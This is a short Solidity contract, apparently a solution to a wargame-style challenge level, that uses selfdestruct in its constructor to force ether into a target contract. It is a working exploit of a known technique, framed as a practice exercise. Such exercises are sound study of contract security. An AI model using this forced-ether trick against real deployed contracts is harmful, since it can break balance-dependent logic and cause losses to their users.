// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel07.sol";

contract ForceAttacker {
    constructor(address target) payable {
        selfdestruct(payable(target));
    }
}
